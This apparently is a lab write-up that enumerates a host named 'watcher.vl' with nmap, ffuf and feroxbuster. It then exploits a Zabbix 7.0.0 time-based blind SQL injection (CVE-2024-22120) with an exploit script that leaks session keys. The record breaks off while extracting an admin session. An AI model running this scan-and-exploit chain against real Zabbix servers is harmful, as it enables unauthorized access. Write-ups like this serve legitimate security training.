
# Enumeration

## Open ports
```python
nmap -p- --min-rate=2000 -sT 10.129.234.163         
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-11 17:59 +0100
Nmap scan report for 10.129.234.163
Host is up (0.020s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
10050/tcp open  zabbix-agent
10051/tcp open  zabbix-trapper

Nmap done: 1 IP address (1 host up) scanned in 21.07 seconds
```

## Nmap
```python
nmap -p 22,80,10050,10051 -A --min-rate=2000 -sT 10.129.234.163
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-11 18:01 +0100
Nmap scan report for 10.129.234.163
Host is up (0.037s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f0:e4:e7:ae:27:22:14:09:0c:fe:1a:aa:85:a8:c3:a5 (ECDSA)
|_  256 fd:a3:b9:36:17:39:25:1d:40:6d:5a:07:97:b3:42:13 (ED25519)
80/tcp    open  http       Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Did not follow redirect to http://watcher.vl/
|_http-server-header: Apache/2.4.52 (Ubuntu)
10050/tcp open  tcpwrapped
10051/tcp open  tcpwrapped
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Website is redirecting to `http://watcher.vl`

Ill add this to `/etc/hosts`

# SSH (22)

## Version info
```python
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f0:e4:e7:ae:27:22:14:09:0c:fe:1a:aa:85:a8:c3:a5 (ECDSA)
|_  256 fd:a3:b9:36:17:39:25:1d:40:6d:5a:07:97:b3:42:13 (ED25519)
```

## Auth method
```python
ssh root@watcher.vl     
The authenticity of host 'watcher.vl (10.129.234.163)' can't be established.
ED25519 key fingerprint is: SHA256:JDOGxd+Q6ONAdpL+ofsWbYXtuRCe30lTgg7EiA3nMMg
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'watcher.vl' (ED25519) to the list of known hosts.
(root@watcher.vl) Password:
```
SSH allows password based authentication, this is less secure

# HTTP (80)

## Ffuf for subdomians
```python
ffuf -u http://watcher.vl/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.watcher.vl' -t 30 -fs 4991

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://watcher.vl/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.watcher.vl
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 30
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 4991
________________________________________________

zabbix                  [Status: 200, Size: 3946, Words: 199, Lines: 33, Duration: 177ms]
:: Progress: [114442/114442] :: Job [1/1] :: 1807 req/sec :: Duration: [0:01:23] :: Errors: 0 ::
```
Found a subdomain `zabbix`

No hidden directories found

Nuclei didnt return anything interesting

Website loads a contact form

![](Pasted%20image%2020260611181416.png)

This could be used for XSS

## `zabbix` subdomain

### Feroxbuster
```python
feroxbuster -u http://zabbix.watcher.vl/ -C 404 --dont-filter

301      GET        9l       28w      321c http://zabbix.watcher.vl/data => http://zabbix.watcher.vl/data/
200      GET       12l       51w     2248c http://zabbix.watcher.vl/assets/img/touch-icon-192x192.png
200      GET        4l       29w     1960c http://zabbix.watcher.vl/assets/img/apple-touch-icon-152x152-precomposed.png
200      GET        6l       27w     1680c http://zabbix.watcher.vl/assets/img/ms-tile-144x144.png
200      GET        3l       20w    61418c http://zabbix.watcher.vl/favicon.ico
403      GET        9l       28w      282c http://zabbix.watcher.vl/assets/styles/
301      GET        9l       28w      329c http://zabbix.watcher.vl/assets/fonts => http://zabbix.watcher.vl/assets/fonts/
403      GET        9l       28w      282c http://zabbix.watcher.vl/app
301      GET        9l       28w      322c http://zabbix.watcher.vl/audio => http://zabbix.watcher.vl/audio/
403      GET        9l       28w      282c http://zabbix.watcher.vl/conf
301      GET        9l       28w      322c http://zabbix.watcher.vl/tests => http://zabbix.watcher.vl/tests/
403      GET        9l       28w      282c http://zabbix.watcher.vl/include
301      GET        9l       28w      324c http://zabbix.watcher.vl/modules => http://zabbix.watcher.vl/modules/
301      GET        9l       28w      324c http://zabbix.watcher.vl/widgets => http://zabbix.watcher.vl/widgets/
403      GET        9l       28w      282c http://zabbix.watcher.vl/local
301      GET        9l       28w      319c http://zabbix.watcher.vl/js => http://zabbix.watcher.vl/js/
301      GET        9l       28w      334c http://zabbix.watcher.vl/widgets/web/views => http://zabbix.watcher.vl/widgets/web/views/
301      GET        9l       28w      323c http://zabbix.watcher.vl/assets => http://zabbix.watcher.vl/assets/
200      GET        4l       19w     1117c http://zabbix.watcher.vl/assets/img/apple-touch-icon-76x76-precomposed.png
200      GET        6l       20w     1630c http://zabbix.watcher.vl/assets/img/apple-touch-icon-120x120-precomposed.png
200      GET        5l       32w     2306c http://zabbix.watcher.vl/assets/img/apple-touch-icon-180x180-precomposed.png
200      GET       40l      244w     1559c http://zabbix.watcher.vl/js/browsers.js
403      GET        9l       28w      282c http://zabbix.watcher.vl/assets/
200      GET     7536l    22526w   248423c http://zabbix.watcher.vl/assets/styles/blue-theme.css
200      GET       32l      231w     3946c http://zabbix.watcher.vl/index.php
200      GET       32l      231w     3946c http://zabbix.watcher.vl/
301      GET        9l       28w      323c http://zabbix.watcher.vl/locale => http://zabbix.watcher.vl/locale/
301      GET        9l       28w      325c http://zabbix.watcher.vl/js/pages => http://zabbix.watcher.vl/js/pages/
301      GET        9l       28w      330c http://zabbix.watcher.vl/assets/styles => http://zabbix.watcher.vl/assets/styles/
301      GET        9l       28w      326c http://zabbix.watcher.vl/locale/en => http://zabbix.watcher.vl/locale/en/
403      GET        9l       28w      282c http://zabbix.watcher.vl/vendor
301      GET        9l       28w      330c http://zabbix.watcher.vl/tests/include => http://zabbix.watcher.vl/tests/include/
301      GET        9l       28w      330c http://zabbix.watcher.vl/tests/general => http://zabbix.watcher.vl/tests/general/
301      GET        9l       28w      329c http://zabbix.watcher.vl/tests/images => http://zabbix.watcher.vl/tests/images/
301      GET        9l       28w      332c http://zabbix.watcher.vl/tests/templates => http://zabbix.watcher.vl/tests/templates/
301      GET        9l       28w      328c http://zabbix.watcher.vl/widgets/web => http://zabbix.watcher.vl/widgets/web/
301      GET        9l       28w      328c http://zabbix.watcher.vl/widgets/map => http://zabbix.watcher.vl/widgets/map/
301      GET        9l       28w      336c http://zabbix.watcher.vl/widgets/web/actions => http://zabbix.watcher.vl/widgets/web/actions/
301      GET        9l       28w      339c http://zabbix.watcher.vl/widgets/item/assets/js => http://zabbix.watcher.vl/widgets/item/assets/js/
301      GET        9l       28w      338c http://zabbix.watcher.vl/assets/styles/vendors => http://zabbix.watcher.vl/assets/styles/vendors/
301      GET        9l       28w      335c http://zabbix.watcher.vl/widgets/item/views => http://zabbix.watcher.vl/widgets/item/views/
301      GET        9l       28w      334c http://zabbix.watcher.vl/tests/include/web => http://zabbix.watcher.vl/tests/include/web/
301      GET        9l       28w      335c http://zabbix.watcher.vl/widgets/map/assets => http://zabbix.watcher.vl/widgets/map/assets/
301      GET        9l       28w      343c http://zabbix.watcher.vl/tests/include/web/elements => http://zabbix.watcher.vl/tests/include/web/elements/
301      GET        9l       28w      329c http://zabbix.watcher.vl/widgets/item => http://zabbix.watcher.vl/widgets/item/
301      GET        9l       28w      328c http://zabbix.watcher.vl/widgets/url => http://zabbix.watcher.vl/widgets/url/
301      GET        9l       28w      336c http://zabbix.watcher.vl/widgets/item/assets => http://zabbix.watcher.vl/widgets/item/assets/
301      GET        9l       28w      335c http://zabbix.watcher.vl/widgets/url/assets => http://zabbix.watcher.vl/widgets/url/assets/
301      GET        9l       28w      334c http://zabbix.watcher.vl/widgets/map/views => http://zabbix.watcher.vl/widgets/map/views/
301      GET        9l       28w      338c http://zabbix.watcher.vl/widgets/map/assets/js => http://zabbix.watcher.vl/widgets/map/assets/js/
301      GET        9l       28w      338c http://zabbix.watcher.vl/tests/include/helpers => http://zabbix.watcher.vl/tests/include/helpers/
301      GET        9l       28w      336c http://zabbix.watcher.vl/widgets/url/actions => http://zabbix.watcher.vl/widgets/url/actions/
301      GET        9l       28w      337c http://zabbix.watcher.vl/widgets/item/actions => http://zabbix.watcher.vl/widgets/item/actions/
301      GET        9l       28w      334c http://zabbix.watcher.vl/widgets/plaintext => http://zabbix.watcher.vl/widgets/plaintext/
301      GET        9l       28w      340c http://zabbix.watcher.vl/widgets/plaintext/views => http://zabbix.watcher.vl/widgets/plaintext/views/
301      GET        9l       28w      334c http://zabbix.watcher.vl/widgets/url/views => http://zabbix.watcher.vl/widgets/url/views/
301      GET        9l       28w      336c http://zabbix.watcher.vl/widgets/map/actions => http://zabbix.watcher.vl/widgets/map/actions/
```

Nuclei didnt find anything

No default creds on the logon portal, but i can login as a guest

This reveals the version `zabbix 7.0.0`

# CVE-2024-22120

https://support.zabbix.com/browse/ZBX-24505

First ill proxy some requests to get the session ID

Then ill send the request and search in the response for `hostids`

```python
10084
```

Found the host ID in the output

![](Pasted%20image%2020260611193043.png)

Then ill decode the full string to just get the ID

```python
769725bb8e582ce30f3d2a3575da191d
```

Now i can exploit this

```python
python3 zabbix_server_time_based_blind_sqli.py --ip zabbix.watcher.vl --sid 769725bb8e582ce30f3d2a3575da191d --hostid 10084 | grep '(+)'

...[SNIP]...

(+) session_key=b9857bc76e26cf108766043dbf43544b
(+) config session_key=b9857bc76e26cf108766043dbf43544b
(+) Extracting admin session_id...
```
